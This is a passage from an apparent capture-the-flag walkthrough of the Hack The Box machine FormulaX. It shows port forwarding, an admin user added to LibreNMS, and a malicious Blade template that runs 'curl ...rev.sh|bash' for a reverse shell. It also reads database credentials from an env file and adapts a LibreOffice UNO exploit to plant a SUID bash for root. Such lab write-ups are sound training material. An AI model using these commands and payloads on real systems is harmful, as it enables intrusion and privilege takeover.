</span></span></span></code></pre></div><p>Using <code>cURL</code> against our <code>localhost</code> we can see that it is a webpage:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ curl -s http://localhost:3000
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>&lt;!DOCTYPE html&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;html&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;head&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;meta charset=&#34;UTF-8&#34; /&gt;
</span></span></span><span class=line><span class=cl><span class=go>        &lt;meta http-equiv=&#34;refresh&#34; content=&#34;0;url=&#39;http://localhost:3000/login&#39;&#34; /&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>        &lt;title&gt;Redirecting to http://localhost:3000/login&lt;/title&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;/head&gt;
</span></span></span><span class=line><span class=cl><span class=go>    &lt;body&gt;
</span></span></span><span class=line><span class=cl><span class=go>        Redirecting to &lt;a href=&#34;http://localhost:3000/login&#34;&gt;http://localhost:3000/login&lt;/a&gt;.
</span></span></span><span class=line><span class=cl><span class=go>    &lt;/body&gt;
</span></span></span><span class=line><span class=cl><span class=go>&lt;/html&gt;
</span></span></span></code></pre></div><p>Since we have a connection via <code>SSH</code>, I will attempt a <code>Local Port Forwarding</code> to be able to access this internal port. I will convert port <code>3000</code> of the victim machine in my port <code>1234</code>, log out from <code>SSH</code> service and now run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;manchesterunited&#39; ssh -o stricthostkeychecking=no -L 1234:localhost:3000 frank_dorky@10.10.11.6
</span></span></span></code></pre></div><p>Now we can visit <code>http://localhost:1234</code> and see a new login panel:</p><p><img alt="FormulaX 7" src=/pentesting/images/FormulaX_7.png></p><p>which is running <code>LibreNMS</code>. Googling <code>What is LibreNMS</code> we have:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content><code>LibreNMS</code> is a fully featured network monitoring system that provides a wealth of features and device support. <code>LibreNMS</code> can be used to monitor a wide range of features, including support for a variety of protocols, performance monitoring, alerts, and more.</div></div></p><p>Looking for <code>librenms</code> in the target machine from the <code>SSH</code> session shows 3 directories:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:~$ find / -name &#34;librenms&#34; 2&gt;/dev/null
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>/var/lib/mysql/librenms
</span></span></span><span class=line><span class=cl><span class=go>/etc/logrotate.d/librenms
</span></span></span><span class=line><span class=cl><span class=go>/opt/librenms
</span></span></span></code></pre></div><p>Also searching how to add new users from console, we find <a href=https://community.librenms.org/t/adding-admin-users-on-librenms/20782 class=external-link target=_blank rel=noopener>this community forum</a> that explains it. There should be a file called <code>adduser.php</code> that allow us to add users.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:/opt/librenms$ ls -la /opt/librenms/adduser.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>-rwxr-xr-x 1 librenms librenms 956 Oct 18  2022 /opt/librenms/adduser.php
</span></span></span></code></pre></div><p>Running this file we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:/opt/librenms$ /opt/librenms/adduser.php
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Add User Tool
</span></span></span><span class=line><span class=cl><span class=go>Usage: ./adduser.php &lt;username&gt; &lt;password&gt; &lt;level 1-10&gt; [email]
</span></span></span></code></pre></div><p>so I will create an <code>admin</code> user called <code>gunzf0x</code> with level <code>10</code> (since, es explained from the forum post, <code>10</code> means <code>admin</code> role):</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>frank_dorky@formulax:/opt/librenms$ /opt/librenms/adduser.php gunzf0x gunzf0x123 10 gunzf0x@gunzf0x.htb
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User gunzf0x added successfully
</span></span></span></code></pre></div><p>We can now enter to the panel with the credentials <code>gunzf0x:gunzf0x123</code>, or the user we have added:</p><p><img alt="FormulaX 8" src=/pentesting/images/FormulaX_8.png></p><p>Going to <code>Gadget Symbol</code> at the side of my username, then to <code>Validate Config</code> and scrolling down shows something:</p><p><img alt="FormulaX 9" src=/pentesting/images/FormulaX_9.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>FAIL: server_name is set incorrectly for your webserver, update your webserver config. localhost librenms.com
</span></span></code></pre></div><p>To fix this issue, I add <code>librenms.com</code> as <code>localhost</code> on my <code>/etc/hosts</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ echo &#34;127.0.0.1 librenms.com&#34; | sudo tee -a /etc/hosts
</span></span></span></code></pre></div><p>Now, I can visit <code>http://librenms.com:1234</code>, go to <code>Validate Config</code> again, but now I got the error:</p><p><img alt="FormulaX 10" src=/pentesting/images/FormulaX_10.png></p><div class=highlight><pre tabindex=0 class=chroma><code class=language-text data-lang=text><span class=line><span class=cl>FAIL: base_url is not set correctly
</span></span></code></pre></div><p>Basically, it is due to a error on the port selected at the <code>Local Port Forwarding</code> step: The victim machine was running <code>LibreNMS</code> on port <code>3000</code>, but I set it on my port <code>1234</code> and, in this case, that is causing a conflict.</p><p>So I will break the <code>SSH</code> connection that made the tunnel, and now I will convert my port <code>3000</code> to port <code>3000</code> of the victim machine.</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;manchesterunited&#39; ssh -o stricthostkeychecking=no -L 3000:localhost:3000 frank_dorky@10.10.11.6
</span></span></span></code></pre></div><p>Re-visiting <code>http://librenms.com:3000/validate</code> do not show warnings this time:</p><p><img alt=FormulaX src=/pentesting/images/FormulaX_11.png></p><p>Now, going to <code>Alert -> Alert Templates</code> allows us to create a new template. Clicking on <code>Create new alert template</code>, displays a new window. Searching <a href=https://docs.librenms.org/Alerting/Templates/ class=external-link target=_blank rel=noopener>how to add templates to LibreNMS</a> we see that we can add a <code>PHP</code> templates. After a little research I discover that <code>LibreNMS</code> uses <code>Blade</code>, a template engine included in <code>Laravel</code>. Following this <a href=https://laravel.com/docs/11.x/blade#raw-php class=external-link target=_blank rel=noopener>simple example of how to add templates on Blade</a> we can then add a malicious template:</p><p><img alt="FormulaX 12" src=/pentesting/images/FormulaX_12.png></p><p>where we add a little script based on <code>PHP</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-php data-lang=php><span class=line><span class=cl><span class=o>@</span><span class=nx>php</span>
</span></span><span class=line><span class=cl><span class=nx>system</span><span class=p>(</span><span class=s1>&#39;curl http://10.10.16.2:8000/rev.sh|bash&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=o>@</span><span class=nx>endphp</span>
</span></span></code></pre></div><p>In my attacker machine I start, again, a <code>Python</code> <code>HTTP</code> server on port <code>8000</code> where <code>rev.sh</code> file was located (the same file we previously used to gain access as <code>www-data</code> user), and start a <code>netcat</code> listener on port <code>443</code>; basically we are repeating the same steps we have done to gain the initial access on the target machine. Then click on <code>Create Template</code> from <code>LibreNMS</code> webpage. After doing this I get a shell as <code>librenms</code> user:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ nc -lvnp 443
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>listening on [any] 443 ...
</span></span></span><span class=line><span class=cl><span class=go>connect to [10.10.16.2] from (UNKNOWN) [10.10.11.6] 52348
</span></span></span><span class=line><span class=cl><span class=go>bash: cannot set terminal process group (943): Inappropriate ioctl for device
</span></span></span><span class=line><span class=cl><span class=go>bash: no job control in this shell
</span></span></span><span class=line><span class=cl><span class=go>librenms@formulax:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>whoami
</span></span></span><span class=line><span class=cl><span class=go>librenms
</span></span></span></code></pre></div><p>The advantage of this user is that it can read <code>/opt/librenms</code> directory. There I can see a <code>.custom.env</code> file:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>librenms@formulax:~$ ls -la /opt/librenms
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>ls -la /opt/librenms
</span></span></span><span class=line><span class=cl><span class=go>total 5216
</span></span></span><span class=line><span class=cl><span class=go>drwxrwx--x   27 librenms librenms    4096 Feb 19 13:33 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x    3 root     root        4096 Feb 16 15:21 ..
</span></span></span><span class=line><span class=cl><span class=go>lrwxrwxrwx    1 root     root           9 Feb 19 13:33 .bash_history -&gt; /dev/null
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x    4 librenms librenms    4096 Feb 16 15:21 .cache
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms     815 Oct 18  2022 .codeclimate.yml
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxr-x    3 librenms librenms    4096 Feb 16 15:21 .config
</span></span></span><span class=line><span class=cl><span class=go>-rw-rw-r--    1 librenms librenms     353 Sep  7  2023 .custom.env
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms     258 Oct 18  2022 .editorconfig
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms      73 Oct 18  2022 .env.example
</span></span></span><span class=line><span class=cl><span class=go>-rw-r--r--    1 librenms librenms     197 Oct 18  2022 .env.travis
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>librenms@formulax:~$ cat /opt/librenms/.custom.env
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>cat /opt/librenms/.custom.env
</span></span></span><span class=line><span class=cl><span class=go>APP_KEY=base64:jRoDTOFGZEO08+68w7EzYPp8a7KZCNk+4Fhh97lnCEk=
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>DB_HOST=localhost
</span></span></span><span class=line><span class=cl><span class=go>DB_DATABASE=librenms
</span></span></span><span class=line><span class=cl><span class=go>DB_USERNAME=kai_relay
</span></span></span><span class=line><span class=cl><span class=go>DB_PASSWORD=mychemicalformulaX
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span><span class=nv>APP_URL</span><span class=o>=</span>
</span></span><span class=line><span class=cl><span class=go>NODE_ID=648b260eb18d2
</span></span></span><span class=line><span class=cl><span class=go>VAPID_PUBLIC_KEY=BDhe6thQfwA7elEUvyMPh9CEtrWZM1ySaMMIaB10DsIhGeQ8Iks8kL6uLtjMsHe61-ZCC6f6XgPVt7O6liSqpvg
</span></span></span><span class=line><span class=cl><span class=go>VAPID_PRIVATE_KEY=chr9zlPVQT8NsYgDGeVFda-AiD0UWIY6OW-jStiwmTQ
</span></span></span></code></pre></div><p>where I can see a user and a password, so we have credentials <code>kai_relay:mychemicalformulaX</code>.</p><p>I check if we can log in via <code>SSH</code> as <code>kai_relay</code> user with these credentials:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.6 -u &#39;kai_relay&#39; -p &#39;mychemicalformulaX&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.6      22     10.10.11.6       [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.6
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.6      22     10.10.11.6       [*] Current user: &#39;kai_relay&#39; was in &#39;sudo&#39; group, please try &#39;--sudo-check&#39; to check if user can run sudo shell
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.6      22     10.10.11.6       [+] kai_relay:mychemicalformulaX  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>and we can.</p><p>We connect as user <code>kai_relay</code> via <code>SSH</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;mychemicalformulaX&#39; ssh -o stricthostkeychecking=no kai_relay@10.10.11.6
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Welcome to Ubuntu 22.04.4 LTS (GNU/Linux 5.15.0-97-generic x86_64)
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go> * Documentation:  https://help.ubuntu.com
</span></span></span><span class=line><span class=cl><span class=go> * Management:     https://landscape.canonical.com
</span></span></span><span class=line><span class=cl><span class=go> * Support:        https://ubuntu.com/pro
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>This system has been minimized by removing packages and content that are
</span></span></span><span class=line><span class=cl><span class=go>not required on a system that users do not log into.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>To restore this content, you can run the &#39;unminimize&#39; command.
</span></span></span><span class=line><span class=cl><span class=go>Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Ubuntu system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span></span><span class=line><span class=cl><span class=go>applicable law.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>The programs included with the Ubuntu system are free software;
</span></span></span><span class=line><span class=cl><span class=go>the exact distribution terms for each program are described in the
</span></span></span><span class=line><span class=cl><span class=go>individual files in /usr/share/doc/*/copyright.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
</span></span></span><span class=line><span class=cl><span class=go>applicable law.
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>kai_relay@formulax:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>kai_relay
</span></span></span></code></pre></div><p>Checking what can this user run as <code>sudo</code> we have something:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Matching Defaults entries for kai_relay on forumlax:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, timestamp_timeout=0, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty, env_reset,
</span></span></span><span class=line><span class=cl><span class=go>    timestamp_timeout=0
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User kai_relay may run the following commands on forumlax:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL) NOPASSWD: /usr/bin/office.sh
</span></span></span></code></pre></div><p>It is a <code>Bash</code> script. Checking whats does the script that we can run with privileges we have:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ cat /usr/bin/office.sh
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=gp>#</span>!/bin/bash
</span></span><span class=line><span class=cl><span class=go>/usr/bin/soffice --calc --accept=&#34;socket,host=localhost,port=2002;urp;&#34; --norestore --nologo --nodefault --headless
</span></span></span></code></pre></div><p>where I see it is executing <code>/usr/bin/soffice</code> binary.</p><p>Searching for <code>what is soffice</code> we get:<div class="notice info"><div class=notice-title><i class="fa-solid fa-exclamation-circle" aria-hidden=true></i>Info</div><div class=notice-content>The <code>soffice.exe</code> by The Document Foundation is the executable file for the <code>LibreOffice</code> office suite. It is responsible for launching and running the various programs within the suite, such as Writer, Calc, Impress, and others</div></div></p><p>Basically, it is a script to start running <code>LibreOffice</code> service in the victim machine, with <code>root</code> permissions. Therefore, we should find a way to exploit this service.</p><p>Searching now for <code>soffice exploit</code> on Google leads us to <code>exploit-db</code>, more specifically to <a href=https://www.exploit-db.com/exploits/46544 class=external-link target=_blank rel=noopener>this PoC</a>. I copy this code, paste it into the target machine in a file called <code>/tmp/soffice_exploit.py</code> using <code>nano</code>, and instead of executing <code>calc.exe</code> I change the last line from:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shell_execute</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;calc.exe&#34;</span><span class=p>,</span> <span class=s1>&#39;&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>to</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>shell_execute</span><span class=o>.</span><span class=n>execute</span><span class=p>(</span><span class=s2>&#34;/bin/bash&#34;</span><span class=p>,</span> <span class=s1>&#39;/tmp/exploit.sh&#39;</span><span class=p>,</span><span class=mi>1</span><span class=p>)</span>
</span></span></code></pre></div><p>to execute a malicious <code>Bash</code> script called <code>/tmp/exploit.sh</code>, which I will create now.</p><p>We will create the following malicious script:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=cp>#!/bin/bash
</span></span></span><span class=line><span class=cl><span class=cp></span>cp <span class=k>$(</span>which bash<span class=k>)</span> /tmp/gunzf0x <span class=p>;</span> chmod <span class=m>4755</span> /tmp/gunzf0x
</span></span></code></pre></div><p>that creates a copy of <code>bash</code> binary and, to that copy, assigns to it <code>SUID</code> permissions.</p><p>I use the terminal to create the mentioned script running the command:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ echo -e &#39;#!/bin/bash\ncp $(which bash) /tmp/gunzf0x ; chmod 4755 /tmp/gunzf0x&#39; &gt; /tmp/exploit.sh
</span></span></span></code></pre></div><p>and assign execution permissions to the created script to avoid problems:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ chmod +x /tmp/exploit.sh
</span></span></span></code></pre></div><p>If we just run the PoC exploit itself we get an error:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ python3 /tmp/soffice_exploit.py --host 127.0.0.1 --port 2002
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Connecting to target...
</span></span></span><span class=line><span class=cl><span class=go>Traceback (most recent call last):
</span></span></span><span class=line><span class=cl><span class=go>  File &#34;/tmp/soffice_exploit.py&#34;, line 63, in &lt;module&gt;
</span></span></span><span class=line><span class=cl><span class=go>    context = resolver.resolve(
</span></span></span><span class=line><span class=cl><span class=go>__main__.com.sun.star.connection.NoConnectException: Connector : couldn&#39;t connect to socket (Connection refused) ./io/source/connector/connector.cxx:117
</span></span></span></code></pre></div><p>We get a connection error.
This is because the <code>LibreOffice</code> service is not running yet on the victim machine; we have to start it. So I connect via <code>SSH</code> again as <code>kai_relay</code> user in another terminal. In the current terminal I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ sudo /usr/bin/office.sh
</span></span></span></code></pre></div><p>and in the other terminal I run:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ python3 /tmp/soffice_exploit.py --host localhost --port 2002
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[+] Connecting to target...
</span></span></span><span class=line><span class=cl><span class=go>[+] Connected to localhost
</span></span></span></code></pre></div><p>I check if this has worked, and my file is there:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ ls -la /tmp
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>total 1440
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt 14 root      root        12288 May 22 04:43 .
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x 19 root      root         4096 Feb 20 16:16 ..
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .ICE-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .Test-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .X11-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .XIM-unix
</span></span></span><span class=line><span class=cl><span class=go>drwxrwxrwt  2 root      root         4096 May 20 18:10 .font-unix
</span></span></span><span class=line><span class=cl><span class=go>srwxr-xr-x  1 root      root            0 May 22 04:38 OSL_PIPE_0_SingleOfficeIPC_53bc4297d6d012e1a744f3977d159334
</span></span></span><span class=line><span class=cl><span class=go>-rwxrwxr-x  1 kai_relay kai_relay      68 May 22 04:42 exploit.sh
</span></span></span><span class=line><span class=cl><span class=go>-rwsr-xr-x  1 root      root      1396520 May 22 04:43 gunzf0x
</span></span></span><span class=line><span class=cl><span class=go>drwxr-xr-x  2 root      root         4096 May 22 04:38 hsperfdata_root
</span></span></span><span class=line><span class=cl><span class=go>drwx------  2 root      root         4096 May 22 04:38 lu23658821vhl2.tmp
</span></span></span><span class=line><span class=cl><span class=go>&lt;SNIP&gt;
</span></span></span></code></pre></div><p>We can become <code>root</code> finally running it with <code>-p</code> flag:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>kai_relay@formulax:~$ /tmp/gunzf0x -p
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>gunzf0x-5.1# whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>root   
</span></span></span></code></pre></div><p>Game Over. We can read the <code>root</code> user flag at <code>/root</code> directory.</p><p>~ Happy Hacking</p></div><footer></footer></article></section></div><footer class=footer><section class=container>¬©
2023 -
2024
gunzf0x
¬∑
Powered by <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a> & <a href=https://github.com/luizdepra/hugo-coder/ target=_blank rel=noopener>Coder</a>.</section></footer></main><script src=/pentesting/js/coder.min.6ae284be93d2d19dad1f02b0039508d9aab3180a12a06dcc71b0b0ef7825a317.js integrity="sha256-auKEvpPS0Z2tHwKwA5UI2aqzGAoSoG3McbCw73gloxc="></script></body></html>